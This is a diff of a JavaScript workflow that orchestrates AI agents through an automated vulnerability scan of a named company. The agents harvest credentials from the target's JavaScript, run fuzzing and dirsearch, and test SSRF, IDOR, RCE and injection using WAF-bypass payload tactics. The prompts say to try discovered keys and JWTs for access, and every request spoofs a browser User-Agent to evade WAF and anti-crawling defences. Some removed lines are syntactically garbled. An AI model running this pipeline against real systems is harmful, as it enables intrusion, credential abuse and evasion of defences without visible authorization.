@@ -1,7 +1,6 @@
 // SRC_SKILLS_V1 - 八阶段全流程 Workflow 编排
 // 使用: Workflow({scriptPath: '...', args: {company: '货讯通科技', mode: 'full'}})
 // mode: 'full' | 'phase3' (跳过资产发现和深度分析，直接挖洞) | 'phase5' (直接出报告) | 'url' (指定单个URL)
-// 可选: proxy: 'http://127.0.0.1:8080' 强制所有阶段网络请求走代理；skipDirsearch: true 直接跳过 Phase 3 dirsearch
 
 export const meta = {
   name: 'src-full-scan',
@@ -23,7 +22,7 @@ export const meta = {
 // ============================================================
 const SRC_BASE = '/home/my/butiansrc/Exclusive_SRC'
 
-// P2: 共享字典 — SRC↔ZC 互相合并积累的API模式（合并而非覆盖，减少竞态丢失）
+// P2: 共享字典 — SRC↔ZC 互相复制积累的API模式
 try {
   const fs = require('fs')
   const skillsRoot = '/home/my/.claude/skills'
@@ -35,111 +34,35 @@ try {
     const src = `${skillsRoot}/${from}/references/api_patterns.json`
     const dst = `${skillsRoot}/${to}/references/api_patterns.json`
     if (fs.existsSync(src)) {
-      if (fs.existsSync(dst)) {
-        // 合并模式：读取双方，合并数组再写回
-        try {
-          const srcData = JSON.parse(fs.readFileSync(src, 'utf8'))
-          const dstData = JSON.parse(fs.readFileSync(dst, 'utf8'))
-          // 合并 common_endpoints
-          const mergedEndpoints = [...new Set([...(srcData.common_endpoints || []), ...(dstData.common_endpoints || [])])]
-          // 合并 path_segments
-          const mergedSegments = [...new Set([...(srcData.path_segments || []), ...(dstData.path_segments || [])])]
-          // 合并 api_prefixes（保留较大 count）
-          const mergedPrefixes = { ...(dstData.api_prefixes || {}) }
-          for (const [k, v] of Object.entries(srcData.api_prefixes || {})) {
-            mergedPrefixes[k] = (mergedPrefixes[k] || 0) + (v.count || v)
-          }
-          dstData.common_endpoints = mergedEndpoints
-          dstData.path_segments = mergedSegments
-          dstData.api_prefixes = mergedPrefixes
-          fs.writeFileSync(dst, JSON.stringify(dstData, null, 2))
-          log(`  📚 字典合并: ${from} ↔ ${to} (${mergedEndpoints.length} endpoints, ${mergedSegments.length} segments)`)
-        } catch(e) {
-          // 合并失败回退到覆盖
-          fs.copyFileSync(src, dst)
-          log(`  📚 字典覆盖(合并失败): ${from} → ${to}`)
-        }
-      } else {
-        fs.copyFileSync(src, dst)
-        log(`  📚 字典初始同步: ${from} → ${to}`)
-      }
+      fs.copyFileSync(src, dst)
+      log(`  📚 字典共享: ${from} → ${to}`)
     }
   }
 } catch(e) { /* 字典共享非关键，失败不影响主流程 */ }
 const SKILL_SCRIPTS = '/home/my/.claude/skills/SRC_SKILLS_V1/scripts'
-const CALLSITE_EXTRACTOR = (() => { try { return require(`${SKILL_SCRIPTS}/callsite_extractor.cjs`) } catch(e) { return null } })()
-
-function getStructuredCallSites(globalName = '__p2_call_sites_json') {
-  try { return JSON.parse(globalThis[globalName] || '[]') } catch(e) { return [] }
-}
-
-function appendStructuredCallSites(globalName, dumpDir, target) {
-  if (!CALLSITE_EXTRACTOR || !dumpDir) return []
-  try {
-    const found = CALLSITE_EXTRACTOR.extractFromDump(dumpDir, target)
-    if (!found.length) return []
-    const merged = CALLSITE_EXTRACTOR.mergeCallSites(getStructuredCallSites(globalName), found)
-    globalThis[globalName] = JSON.stringify(merged)
-    try { require('fs').writeFileSync(`${dumpDir}/_api_call_sites.json`, JSON.stringify(found, null, 2)) } catch(_) {}
-    return found
-  } catch(e) {
-    log(`  ⚠️ call-site结构化提取跳过: ${e.message || e}`)
-    return []
-  }
-}
-
-function formatStructuredCallSiteContext(globalName = '__p2_call_sites_json') {
-  const entries = getStructuredCallSites(globalName)
-  if (!entries.length) return '（无结构化 call-site 参数；POST端点必须先空Body探测并从响应体反推参数）'
-  const summary = CALLSITE_EXTRACTOR ? CALLSITE_EXTRACTOR.summarize(entries, 80) : JSON.stringify(entries.slice(0, 80), null, 2)
-  return `${summary}\n\n原始JSON前80条:\n${JSON.stringify(entries.slice(0, 80), null, 2).substring(0, 12000)}`
-}
-
-const PARAM_DRIVEN_TESTING_GUIDE = `
-**【参数驱动漏洞测试策略 — harness强制】**
-1. 优先使用上方结构化 call-site JSON 的 request_params，而不是只看 API 路径名。
-2. 按参数字段决定漏洞类型：url/src/href/link/redirect/file_url/image_url => SSRF/路径穿越；file/path/filename => 任意文件读写；id/userId/orderId/companyId => IDOR；page/pageSize/limit/offset => 批量遍历；content/html/template/body => XSS/SSTI；xml/json/data/payload => XXE/反序列化/注入；token/apiKey/secret/sign => 认证绕过；cmd/exec/code/expression/sql => RCE/SQLi；price/amount/role/status => 业务逻辑。
-3. request_params 为 unresolved 或 response_probe_required=true 时，对 POST/PUT/PATCH 先发空 JSON/Form body，根据错误响应字段名反推参数，再按字段名选择测试方向。
-4. 标准 payload 被拦截时，从漏洞原理和参数合法格式推绕过：SSRF 试 IPv6/IPv4-mapped/DNS rebinding/302/URL解析差异；路径穿越试双编码/Unicode/协议变体；注入类试大小写、Content-Type、参数污染、编码差异。
-`
 
 // ============================================================
 // 真实 User-Agent 配置 — 所有 curl 请求使用浏览器UA
 // ============================================================
 const REAL_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
 const UA_FLAG = `-H 'User-Agent: ${REAL_UA}'`
-let UA_INSTR = `⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: ${REAL_UA}'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**`
+const UA_INSTR = `⚠️ **User-Agent 硬性规则：所有 curl 命令必须添加 -H 'User-Agent: ${REAL_UA}'（或等效的浏览器UA），禁止使用默认 curl User-Agent，否则会被WAF/反爬识别拦截。同时添加 Accept-Language: zh-CN,zh;q=0.9 和 Accept: */* 头。**`
 
-// 动态检测 dirsearch 字典路径（兼容不同 Python 版本）
-const DIRSEARCH_DICT = (() => {
-  const pyVers = ['python3.14', 'python3.13', 'python3.12', 'python3.11', 'python3.10']
-  for (const v of pyVers) {
-    try { const p = `/home/my/.local/lib/${v}/site-packages/dirsearch/db/dicc.txt`; if (require('fs').existsSync(p)) return p } catch(_) {}
-  }
-  return '/home/my/.local/lib/python3.14/site-packages/dirsearch/db/dicc.txt'
-})()
-
-const parseWorkflowBool = (v) => v === true || v === 1 || v === '1' || String(v).toLowerCase() === 'true' || String(v).toLowerCase() === 'yes'
-const shQuote = (s) => "'" + String(s).replace(/'/g, "'\\''") + "'"
-
-let companyName, mode, singleUrl, workflowOptions
+let companyName, mode, singleUrl
 if (typeof args === 'string') {
   // 修复：Workflow 工具传递的对象 args 可能被序列化为 JSON 字符串
   // 先尝试 JSON 解析，成功则作为对象处理，否则当做公司名
   let parsed = null
   try { parsed = JSON.parse(args) } catch (_) {}
   if (parsed && typeof parsed === 'object') {
-    workflowOptions = parsed
     companyName = parsed.company || null
     mode = parsed.mode || 'full'
     singleUrl = parsed.url || null
   } else {
-    workflowOptions = {}
     companyName = args
     mode = 'full'
   }
 } else if (typeof args === 'object' && args) {
-  workflowOptions = args
   companyName = args.company || null
   mode = args.mode || 'full'
   singleUrl = args.url || null
@@ -148,35 +71,9 @@ if (typeof args === 'string') {
     return { error: 'need_url', message: '请指定url参数' }
   }
 } else {
-  workflowOptions = {}
   companyName = null
   mode = 'full'
 }
-
-const workflowProxyUrl = (
-  workflowOptions.proxy ||
-  workflowOptions.proxyUrl ||
-  workflowOptions.httpProxy ||
-  workflowOptions.httpsProxy ||
-  workflowOptions.allProxy ||
-  (parseWorkflowBool(workflowOptions.useProxy) ? (() => { try { return typeof process !== 'undefined' ? (process.env.CLAUDE_WORKFLOW_PROXY || process.env.WORKFLOW_PROXY || process.env.HTTPS_PROXY || process.env.HTTP_PROXY || '') : '' } catch(e) { return '' } })() : '') ||
-  (() => { try { return typeof process !== 'undefined' ? (process.env.CLAUDE_WORKFLOW_PROXY || process.env.WORKFLOW_PROXY || '') : '' } catch(e) { return '' } })() ||
-  ''
-)
-const skipDirsearch = parseWorkflowBool(workflowOptions.skipDirsearch) ||
-  parseWorkflowBool(workflowOptions.noDirsearch) ||
-  (() => { try { return typeof process !== 'undefined' ? (parseWorkflowBool(process.env.CLAUDE_WORKFLOW_SKIP_DIRSEARCH) || parseWorkflowBool(process.env.WORKFLOW_SKIP_DIRSEARCH)) : false } catch(e) { return false } })()
-const PROXY_ENV_PREFIX = workflowProxyUrl
-  ? `HTTP_PROXY=${shQuote(workflowProxyUrl)} HTTPS_PROXY=${shQuote(workflowProxyUrl)} ALL_PROXY=${shQuote(workflowProxyUrl)} http_proxy=${shQuote(workflowProxyUrl)} https_proxy=${shQuote(workflowProxyUrl)} all_proxy=${shQuote(workflowProxyUrl)}`
-  : ''
-const NET_ENV_PREFIX = PROXY_ENV_PREFIX ? `${PROXY_ENV_PREFIX} ` : ''
-const PROXY_CURL_FLAG = workflowProxyUrl ? `--proxy ${shQuote(workflowProxyUrl)}` : ''
-const PROXY_DIRSEARCH_FLAG = workflowProxyUrl ? `--proxy ${shQuote(workflowProxyUrl)}` : ''
-if (workflowProxyUrl) {
-  UA_INSTR += `\n🌐 **代理硬性规则：本次 workflow 已启用代理 ${workflowProxyUrl}。所有阶段的网络请求都必须走该代理：curl 添加 ${PROXY_CURL_FLAG}；dirsearch 添加 ${PROXY_DIRSEARCH_FLAG}；httpx 使用 -proxy ${workflowProxyUrl}；wget 使用 -e use_proxy=yes -e http_proxy=${workflowProxyUrl} -e https_proxy=${workflowProxyUrl}；python/requests/脚本命令前置 ${PROXY_ENV_PREFIX}。禁止绕过代理直连目标。**`
-}
-if (workflowProxyUrl) log(`🌐 Workflow代理已启用: ${workflowProxyUrl}`)
-if (skipDirsearch) log('📂 skipDirsearch 已启用: Phase 3 将跳过 dirsearch')
 
 // 未指定公司名时从URL自动提取
 let _isAutoCompany = false
@@ -192,34 +89,9 @@ if (!companyName && singleUrl) {
   // 统一替换为 _CLI_TARGET_ 作为路径标识
   if (/^\d+\.\d+\.\d+\.\d+$/.test(companyName) || companyName === 'localhost') {
     companyName = '_CLI_TARGET_'
-    log(**ℹ️ URL域名解析为IP/本地地址，统一使用 "_CLI_TARGET_" 作为目录标识**)
+    log(`ℹ️ URL域名解析为IP/本地地址，统一使用 "_CLI_TARGET_" 作为目录标识`)
   } else {
-    log(**ℹ️ 未指定公司名，自动使用URL域名作为公司标识**)
-  }
-}
-
-const phase2StateId = String(companyName || singleUrl || 'default').replace(/[^a-zA-Z0-9_.-]/g, '_').slice(0, 80)
-const PHASE2_STATE_PATH = `/tmp/workflow_phase2_state_${meta.name}_${phase2StateId}.json`
-const LEGACY_PHASE2_STATE_PATH = '/tmp/workflow_phase2_state.json'
-
-function readPhase2State() {
-  const fs = require('fs')
-  for (const p of [PHASE2_STATE_PATH, LEGACY_PHASE2_STATE_PATH]) {
-    try {
-      if (!fs.existsSync(p)) continue
-      const state = JSON.parse(fs.readFileSync(p, 'utf8'))
-      if (p === LEGACY_PHASE2_STATE_PATH && (state.workflow !== meta.name || state.state_id !== phase2StateId)) continue
-      return state
-    } catch(_) {}
-  }
-  return null
-}
-
-function savePhase2State(state) {
-  const fs = require('fs')
-  state = { ...(state || {}), workflow: meta.name, state_id: phase2StateId }
-  for (const p of [PHASE2_STATE_PATH, LEGACY_PHASE2_STATE_PATH]) {
-    try { fs.writeFileSync(p, JSON.stringify(state)) } catch(_) {}
+    log(`ℹ️ 未指定公司名，自动使用URL域名作为公司标识`)
   }
 }
 
@@ -291,9 +163,8 @@ if (companyName && !mode.startsWith('phase5')) {
 }
 
 // E: TTL 过期检查 — 降级过期资产（基于字符串日期比较，避免new Date()被Workflow禁用）
-// 日期优先级: args.today > args.date > 默认值
-const _todayStr = args?.today || args?.date || '2026-07-20'
 if (p0_tracker?.exists && p0_tracker?.assets) {
+  const _todayStr = '2026-07-09'
   const _todayParts = _todayStr.split('-').map(Number)
   const _todayDays = _todayParts[0]*365 + _todayParts[1]*30 + _todayParts[2]
   for (const [url, info] of Object.entries(p0_tracker.assets)) {
@@ -613,20 +484,9 @@ phase('深度分析')
 // 声明全局变量承载 Phase 2 JS分析结果，供 Phase 3 使用
 let p2_discoveries_text = ''
 // Phase 3/4 的发现结果也在外层声明，供后续阶段使用
-let p3_unauth, p3_other, p3_quick, p3_dirsearch, p3_codeaudit, p4_dirscan, p4_verify
+let p3_unauth, p3_other, p3_quick, p4_dirscan, p4_verify
 // 聚合发现数据，供 Phase 5 写入线索文件
 let p3_findings_data = []
-
-try {
-  const savedP2 = readPhase2State()
-  if (savedP2) {
-    globalThis.__p2_creds_json = savedP2.creds || globalThis.__p2_creds_json || '[]'
-    globalThis.__p2_js_dirs_json = savedP2.js_dirs || globalThis.__p2_js_dirs_json || '[]'
-    globalThis.__p2_call_sites_json = savedP2.call_sites || globalThis.__p2_call_sites_json || '[]'
-    globalThis.__p2_fw_info = savedP2.fw_info || globalThis.__p2_fw_info || '[]'
-    log(`  ♻️ 恢复Phase2结构化状态: ${PHASE2_STATE_PATH}`)
-  }
-} catch(e) {}
 
 if (mode.startsWith('phase3') || mode.startsWith('phase5')) {
   log('[2/8] ⏭️ 跳过（用户指定模式）')
@@ -649,98 +509,92 @@ if (mode.startsWith('phase3') || mode.startsWith('phase5')) {
       analyses = await pipeline(
       targets,
       async (target) => {
-        // === Step A: 下载JS（使用schema结构化输出，自动重试1次） ===
-        let dlResult = null
+        // === Step A+B+Creds: 合并机械操作（含自动重试） ===
+        // 失败自动重试1次
         for (let _retry = 0; _retry < 2; _retry++) {
-          dlResult = await agent(
-            `执行以下命令:
-${NET_ENV_PREFIX}python3 ${SKILL_SCRIPTS}/download_js.py "${target}" "${SRC_BASE}/${companyName}/js_dumps" --ua "${REAL_UA}"
+          var mechResult = await agent(
+          `执行以下命令串行:
+# 1. 下载JS
+python3 ${SKILL_SCRIPTS}/download_js.py "${target}" "${SRC_BASE}/${companyName}/js_dumps" --ua "${REAL_UA}"
+# 2. 枚举chunk补下
+python3 ${SKILL_SCRIPTS}/enumerate_chunks.py "<从下载结果提取的dump_dir>" "${target}" --ua "${REAL_UA}"
+# 3. 提取凭证
+python3 ${SKILL_SCRIPTS}/extract_creds.py "\${dump_dir}" 2>&1
 
-将下载结果JSON原样输出，不要加任何额外文字。`,
-            { label: `📥 下载JS: ${target}`, schema: {
-              type: 'object',
-              properties: {
-                status: { type: 'string', enum: ['ok', 'unreachable'] },
-                target: { type: 'string' },
-                dump_dir: { type: 'string' },
-                file_count: { type: 'number' },
-                target_hash: { type: 'string' },
-              },
-              required: ['status', 'dump_dir', 'file_count', 'target_hash'],
-            }, phase: '深度分析' }
-          )
-          if (dlResult && dlResult.file_count > 0) {
-            log(`  📥 ${target}: 下载 ${dlResult.file_count} 个文件, hash=${dlResult.target_hash}`)
-            break
+注意: <DUMP_DIR> 通过下载结果的 dump_dir 获取。
+先执行1，从JSON输出提取dump_dir，再执行2和3。
+
+输出格式要求：
+---DOWNLOAD_RESULT---
+{...下载结果JSON...}
+---CHUNK_RESULT---
+{...chunk结果JSON...}
+---CREDS_RESULT---
+{...凭证结果JSON...}`,
+          { label: `🤖 机械操作: ${target}`, phase: '深度分析' }
+        )
+
+        // 解析结果
+        let dl_dump_dir = "${SRC_BASE}/${companyName}/js_dumps"
+        let dl_file_count = 0
+        let target_hash = ""
+        try {
+          const dlPart = (mechResult || '').split('---DOWNLOAD_RESULT---')[1] || ''
+          const dlMatch = dlPart.match(/{[^}]+}/)
+          if (dlMatch) {
+            const dl = JSON.parse(dlMatch[0])
+            if (dl.dump_dir) dl_dump_dir = dl.dump_dir
+            if (dl.file_count) dl_file_count = dl.file_count
+            if (dl.target_hash) target_hash = dl.target_hash
           }
-          if (_retry === 0) log(`  ⚠️ ${target}: JS下载0文件，重试...`)
-          dlResult = null
-        }
+        } catch(e) {}
+        if (dl_file_count > 0) log(`  📥 ${target}: 下载 ${dl_file_count} 个文件, hash=${target_hash}`)
+        if (dl_file_count === 0) log(`  ⚠️ ${target}: JS下载可能失败（0文件），检查网络或target是否可达`)
+        if (target_hash === "") log(`  ⚠️ ${target}: 未解析到target_hash，chunk枚举和凭证提取可能未执行`)
 
-        const dump_dir = dlResult?.dump_dir || "${SRC_BASE}/${companyName}/js_dumps"
-        const dl_file_count = dlResult?.file_count || 0
-        const target_hash = dlResult?.target_hash || ''
-
-        // 下载成功后执行枚举chunk和提取凭证
-        if (dl_file_count > 0) {
-          // === Step B: 枚举chunk补下 ===
-          try {
-            await agent(
-              `${NET_ENV_PREFIX}python3 ${SKILL_SCRIPTS}/enumerate_chunks.py "${dump_dir}" "${target}" --ua "${REAL_UA}"
-输出命令的stdout摘要。`,
-              { label: `🧩 枚举chunk: ${target}`, phase: '深度分析' }
-            )
-          } catch(e) { log(`  ⚠️ chunk枚举跳过: ${e.message}`) }
-
-          // === Step C: 提取凭证 ===
-          try {
-            const credsResult = await agent(
-              `python3 ${SKILL_SCRIPTS}/extract_creds.py "${dump_dir}" --output "${dump_dir}/_credentials.json"
-将最后一行的JSON结果原样输出。`,
-              { label: `🔐 提取凭证: ${target}`, phase: '深度分析' }
-            )
-            const credLines = (credsResult || '').split('\\n').reverse()
-            for (const l of credLines) {
-              try {
-                const parsed = JSON.parse(l.trim())
-                if (parsed.credentials && parsed.credentials.length > 0) {
-                  if (!globalThis.__p2_creds_json) globalThis.__p2_creds_json = '[]'
-                  const existing = JSON.parse(globalThis.__p2_creds_json)
-                  existing.push(...parsed.credentials)
-                  globalThis.__p2_creds_json = JSON.stringify(existing)
-                  log(`  🔐 ${target}: 提取 ${parsed.credentials.length} 条凭证`)
-                }
-                break
-              } catch(_) { /* 不是JSON行，继续找下一行 */ }
+        // 提取凭证到全局变量
+        try {
+          const credsPart = (mechResult || '').split('---CREDS_RESULT---')[1] || ''
+          const credsMatch = credsPart.match(/{[^}]+}/)
+          if (credsMatch) {
+            const credsData = JSON.parse(credsMatch[0])
+            const creds = credsData.credentials || []
+            if (creds.length > 0) {
+              if (!globalThis.__p2_creds_json) globalThis.__p2_creds_json = '[]'
+              const existing = JSON.parse(globalThis.__p2_creds_json)
+              existing.push(...creds)
+              globalThis.__p2_creds_json = JSON.stringify(existing)
+              log(`  🔐 ${target}: 提取 ${creds.length} 条凭证`)
             }
-          } catch(e) { log(`  ⚠️ 凭证提取跳过: ${e.message}`) }
-
-          // === 记录JS缓存目录信息 ===
-          if (target_hash) {
-            if (!globalThis.__p2_js_dirs_json) globalThis.__p2_js_dirs_json = '[]'
-            const dirs = JSON.parse(globalThis.__p2_js_dirs_json)
-            let hasRecon = false
-            try { hasRecon = fs.existsSync(dump_dir + '/reconstructed') && fs.readdirSync(dump_dir + '/reconstructed').length > 0 } catch(_) {}
-            dirs.push({
-              target_hash: target_hash,
-              dump_dir: dump_dir,
-              js_count: dl_file_count,
-              has_reconstructed: hasRecon,
-              reconstructed_dir: hasRecon ? dump_dir + '/reconstructed' : null,
-            })
-            globalThis.__p2_js_dirs_json = JSON.stringify(dirs)
           }
-          const callSites = appendStructuredCallSites('__p2_call_sites_json', dump_dir, target)
-          if (callSites.length) log(`  🧭 ${target}: 结构化call-site ${callSites.length} 条`)
-        } else {
-          log(`  ⚠️ ${target}: JS下载失败，跳过chunk枚举/凭证提取/分析`)
+        } catch(e) {}
+
+        // 记录JS缓存目录信息
+          // 检查是否成功 — 有文件下载则跳出重试循环
+          if (dl_file_count > 0) break
+          if (_retry === 0) log(`  🔄 ${target}: 下载结果为0文件，等待2秒后重试...`)
+        }  // end retry loop
+        if (target_hash) {
+          if (!globalThis.__p2_js_dirs_json) globalThis.__p2_js_dirs_json = '[]'
+          const dirs = JSON.parse(globalThis.__p2_js_dirs_json)
+          // 检查reconstructed目录
+          const reconDir = dl_dump_dir + '/reconstructed'
+          const hasRecon = fs.existsSync(reconDir) ? fs.readdirSync(reconDir).length > 0 : false
+          dirs.push({
+            target_hash: target_hash,
+            dump_dir: dl_dump_dir,
+            js_count: dl_file_count,
+            has_reconstructed: hasRecon,
+            reconstructed_dir: hasRecon ? reconDir : null,
+          })
+          globalThis.__p2_js_dirs_json = JSON.stringify(dirs)
         }
 
-        // === Step D: Agent 阅读本地文件 + 创造性分析 ===
-        return await agent(
+        // === Step C: Agent 阅读本地文件 + 创造性分析 ===
+        return await agent(        // === Step C: Agent 阅读本地文件 + 创造性分析 ===
           `你是JS逆向和API发现专家，分析已下载到本地的JS文件: ${target}
 
-    已下载文件目录: ${dump_dir}
+    已下载文件目录: ${dl_dump_dir}
     下载文件数: ${dl_file_count}
 
     **你的任务：用Read工具阅读本地JS文件，发挥创造性分析以下内容：**
@@ -749,26 +603,6 @@ ${NET_ENV_PREFIX}python3 ${SKILL_SCRIPTS}/download_js.py "${target}" "${SRC_BASE
     2. **路径模式提取** — 提取所有 "/xxx/yyy" 路径，关注非标准前缀 /gateway/ /dwr/ /sys/ /manage/ /crm/ /erp/
     3. **敏感信息提取** — 查找 AccessKey、SecretKey、JWT(eyJ...)、数据库连接串(mongodb://...)、内网IP、硬编码密码
     4. **鉴权方式识别** — Authorization: Bearer/Basic/X-TOKEN/Cookie/localStorage Token存放
-    5. 🔥 **Call Site 深度追溯 — 对每个发现的API端点，必须追溯其调用现场（call site）**
-       对每个提取到的API路径（如 **/apix/image-colors**），在JS中找到所有 **调用该端点的地方**，提取：
-       - **请求体参数结构**：调用时传入了哪些字段？
-            代码示例:
-            const n = t => e({url:"/apix/image-colors", req:t, method:"POST"});
-            // 找到调用 n(...) 的地方：
-            n({url: "...", width: 200, height: 200})
-            // 提取到的字段: url, width, height → 说明存在 url 参数，即 SSRF 攻击面
-       - **返回值消费方式**：响应数据被怎样使用了？(渲染到页面？传给其他API？)
-       - **参数来源**：参数来自用户输入？固定值？props？store？URL query？
-       - **输出格式**：将每个端点的「字段名列表」结构化输出，如：
-            输出示例:
-            /apix/image-colors: {url, width?, height?, quality?}  ← 有 url 参数，SSRF风险
-            /apix/V1/.../list: {page?, pageSize?, categoryId?}    ← 分页参数
-    6. **调用现场溯源 (Call Site JSON)**：
-       - 如果以上分析找到了请求体参数，输出为结构化JSON格式，供Phase 3直接使用
-       - 如果JS被严重混淆/无法追溯到call site → 输出 **request_params: "unresolved"**，同时**分析响应线索**：
-         - 用Phase 2已有的curl探测能力，对该端点发送一个空POST → 看返回的错误提示中是否包含期望的字段名
-         - 例如返回 **{"error":"缺少参数 imageUrl"}** → 说明有 imageUrl 参数，存在SSRF机会
-         - 这种「反向推断」也是有效的参数发现手段
     5. **凭证反思（关键思维环节）**:
        - 找到accessKey+secretKey → 哪个云服务？试枚举 OBS/S3/OSS Bucket
        - 找到JWT → 解码看user/role，试调API看是否越权
@@ -780,11 +614,6 @@ ${NET_ENV_PREFIX}python3 ${SKILL_SCRIPTS}/download_js.py "${target}" "${SRC_BASE
     - 本地文件分析完成后不要删除缓存文件，留作证据
     - 发挥第一性原理和创造性思维，不要局限于固定模式
     - 注意看Source Map还原出的文件: 检查是否有 reconstructed/ 目录（包含原始TS/Vue/React源码）
-    - 注意检查 _page.html 中的内嵌JSON: 提取 __NUXT__(Nuxt.js)、__NEXT_DATA__(Next.js)、__INITIAL_STATE__(React)、__PRELOADED_STATE__ 等SSR注入数据，其中可能包含API路径、用户角色、权限配置
-    - Source Map sourcesContent 深度分析: reconstructed/ 目录下还原出的源码中可能包含原始TypeScript/Vue/React/JSX，检查其中的API端点定义、配置对象、未公开功能接口
-    - 检查 WebAssembly 引用: 扫描 .wasm 文件路径和 WebAssembly.instantiate 调用，wasm 中可能包含核心算法/密钥
-    - 分析 Service Worker: 检查 sw.js 或 navigator.serviceWorker.register 中的请求拦截逻辑和缓存策略，可能改写/代理API请求
-    - 注意 ESM CDN 依赖: 扫描 esm.sh/jsdelivr/unpkg 等CDN导入，CDN模块可能包含额外API端点
 
     ${UA_INSTR}`,
           { label: `🔬 分析: ${target}`, phase: '深度分析' }
@@ -1037,7 +866,7 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url }).join(String.from
         }
       })
       // 将识别结果纳入 Phase 3 上下文
-      p2_discoveries_text += **\n\n【快速开发框架识别结果】\n** +
+      p2_discoveries_text += `\n\n【快速开发框架识别结果】\n` +
         p2_oss.findings.map(f => {
           if (f.is_suspected_oss || f.framework_name === '疑似开源系统') {
             return `${f.target}: 疑似开源系统 [${f.oss_verdict || '无法判断'}]
@@ -1086,7 +915,7 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url }).join(String.from
     const fuzz_targets = targets.slice(0, 15)
     for (const ft of fuzz_targets) {
       const fuzz_out = "/tmp/smart_fuzz_" + companyName.replace(/[^a-zA-Z0-9]/g,'_') + "_" + ft.replace(/[^a-zA-Z0-9]/g,'_') + ".json"
-      const fuzz_cmd = `${NET_ENV_PREFIX}python3 ${SKILL_SCRIPTS}/smart_fuzz.py "${ft}" --dict ${P2_DICT_PATH} --output ${fuzz_out} --ua "${REAL_UA}"`
+      const fuzz_cmd = `python3 ${SKILL_SCRIPTS}/smart_fuzz.py "${ft}" --dict ${P2_DICT_PATH} --output ${fuzz_out} --ua "${REAL_UA}"`
       
       let fuzz_raw = null
       try {
@@ -1135,19 +964,15 @@ cat ${fuzz_out}`,
       p2_discoveries_text += `\n\n【智能fuzz发现的潜在端点】\n${fuzzSummary}\n`
       log(`  🔄 ${globalThis.__p2_fuzz_findings.length} 个fuzz发现已注入Phase3上下文`)
     }
-    // 仅在实际执行过fuzz的目标上记录dir_enum维度
-    if (fuzz_targets.length > 0) {
-      targets.forEach(t => dimTracker.record(t, 'dir_enum', 'done'))
-    }
+    targets.forEach(t => dimTracker.record(t, 'dir_enum', 'done'))
   // P0-2: 持久化 accumulated 状态到临时文件（避免agent崩溃丢失）
   try {
     const stateToSave = {
       creds: globalThis.__p2_creds_json || '[]',
       js_dirs: globalThis.__p2_js_dirs_json || '[]',
-      call_sites: globalThis.__p2_call_sites_json || '[]',
       fw_info: globalThis.__p2_fw_info || '[]',
     }
-    savePhase2State(stateToSave)
+    require('fs').writeFileSync('/tmp/workflow_phase2_state.json', JSON.stringify(stateToSave))
   } catch(e) {}
 
   markPhase(2, '✅')
@@ -1191,10 +1016,6 @@ if (mode.startsWith('phase5')) {
     log('  ⚠️ 无可用测试目标')
     markPhase(3, '⏭️')
   } else {
-    if (skipDirsearch) {
-      log('  📂 skipDirsearch=true，跳过字典目录扫描 (dirsearch)')
-      p3_dirsearch = { findings: [], new_endpoints: [], waf_detected: [], skipped: true, reason: 'skipDirsearch option enabled' }
-    } else {
     // ============================================================
     // 3.0 dirsearch — 基于字典的标准目录扫描
     // 原理：读取积累字典+通用字典，对目标做广度优先的路径爆破
@@ -1202,7 +1023,7 @@ if (mode.startsWith('phase5')) {
     log('  📂 执行字典目录扫描 (dirsearch)...')
     const P3_DICT_PATH = "${SKILL_SCRIPTS}/../references/api_patterns.json"
 
-    p3_dirsearch = await agent(
+    const p3_dirsearch = await agent(
       `对 ${companyName} 执行 dirsearch 目录扫描（使用 dirsearch 内置字典 + 积累字典）。
 
 ===== 目标列表（前20个） =====
@@ -1217,54 +1038,40 @@ ${targets.slice(0, 20).map(function(t) { return '  ' + t.url + ' — ' + (t.tags
 - framework_patterns 下所有框架的路径
 - api_prefixes 的每个key + path_segments 的每个值组合（如 /api/v3/user, /api/v3/admin ...）
 - common_endpoints 列表
-写入临时文件: \**/tmp/dirsearch_custom.txt\**（每行一个路径，无前导/）
+写入临时文件: \`/tmp/dirsearch_custom.txt\`（每行一个路径，无前导/）
 
-**Step 2: 对每个目标先做 WAF 预检**
-对每个目标URL先执行轻量探测，不要直接开始目录爆破:
-\**\**\`bash
-curl ${PROXY_CURL_FLAG} -skI --max-time 8 "<target_url>" | tee /tmp/waf_headers.txt
-curl ${PROXY_CURL_FLAG} -sk --max-time 8 "<target_url>/_dirsearch_waf_probe_$(date +%s)" -o /tmp/waf_body.txt -D /tmp/waf_probe_headers.txt
-\**\**\`
-如果响应头或响应体出现以下任一特征，判定为存在WAF/安全防护并**跳过该目标的dirsearch**:
-- HTTP 403/405/406/429/503 且响应包含拦截页、验证码、人机验证、访问过快等提示
-- server/header/body 包含 cloudflare, cf-ray, aliyun, acw_tc, punish-loc, keepper, yundun, waf, safedog, yunjiasu, baidu, tencent, qcloud, huawei, imperva, akamai, incapsula, f5, barricade, access denied, forbidden, captcha, request blocked 等关键词
-- 随机不存在路径触发统一拦截页或挑战页
+**Step 2: 对每个目标执行 dirsearch 命令**
+dirsearch 内置字典: /home/my/.local/lib/python3.14/site-packages/dirsearch/db/dicc.txt（9482条内置路径）
 
-命中时只在 waf_detected 中记录 target、evidence、action="skipped_dirsearch"，不要继续扫该目标。
-
-**Step 3: 对未命中WAF的目标执行 dirsearch 命令**
-dirsearch 内置字典: ${DIRSEARCH_DICT}（9482条内置路径）
-
-仅对未命中WAF的目标URL依次执行:
-\**\**\`bash
+对每个目标URL依次执行:
+\`\`\`bash
 # 合并字典运行
-dirsearch -u "<target_url>" ${PROXY_DIRSEARCH_FLAG} \
-  -w ${DIRSEARCH_DICT} \
+dirsearch -u "<target_url>" \
+  -w /home/my/.local/lib/python3.14/site-packages/dirsearch/db/dicc.txt \
   --extra-dict /tmp/dirsearch_custom.txt \
   -e php,asp,aspx,jsp,html,js,json,xml,txt,sql,conf,zip,tar.gz,bak,old,log \
   -t 10 --timeout=5 \
   -o /tmp/dirsearch_results.txt --format plain 2>&1 | tail -50
-\**\**\`
+\`\`\`
 如果 --extra-dict 参数不可用，则改为:
-\**\**\`bash
-cat ${DIRSEARCH_DICT} /tmp/dirsearch_custom.txt | sort -u > /tmp/merged_dict.txt
